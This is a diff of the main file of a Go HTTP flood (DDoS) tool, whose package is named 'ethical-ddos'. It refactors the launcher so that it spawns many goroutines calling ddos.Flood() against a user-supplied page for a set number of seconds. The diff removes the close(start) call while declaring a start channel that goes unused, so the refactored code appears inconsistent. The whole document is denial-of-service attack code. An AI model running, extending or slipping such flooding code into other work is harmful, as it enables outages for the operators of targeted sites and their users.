@@ -2,16 +2,24 @@ package main
 
 import (
 	"bufio"
+	ddos "ethical-ddos/ddos"
 	"fmt"
 	"net/url"
 	"os"
 	"strconv"
 	"strings"
 	"time"
-	"ethical-ddos/ddos"
 )
 
+var start = make(chan bool)
+var host string
+var port string
+var page string
+var mode string
+var key string
+
 func main() {
+
 	fmt.Println("\r\n'||  ||`   ||      ||                '||''''| '||`                   ||` ")
 	fmt.Println(" ||  ||    ||      ||                 ||  .    ||                    ||  ")
 	fmt.Println(" ||''||  ''||''  ''||''  '||''|, ---  ||''|    ||  .|''|, .|''|, .|''||  ")
@@ -55,7 +63,7 @@ func main() {
 	if err != nil {
 		fmt.Println("limit should be a integer")
 	}
-	if contain(page, "?") == 0 {
+	if ddos.Contain(page, "?") == 0 {
 		key = "?"
 	} else {
 		key = "&"
@@ -64,7 +72,7 @@ func main() {
 
 	for i := 0; i < threads; i++ {
 		time.Sleep(time.Microsecond * 100)
-		go flood() // Start threads
+		go ddos.Flood() // Start threads
 		fmt.Printf("\rThreads [%.0f] are ready", float64(i+1))
 		os.Stdout.Sync()
 		//time.Sleep( time.Millisecond * 1)
@@ -76,7 +84,7 @@ func main() {
 		return
 	}
 	fmt.Println("Flood will end in " + os.Args[4] + " seconds.")
-	close(start)
+
 	time.Sleep(time.Duration(limit) * time.Second)
 	//Keep the threads continue
 }
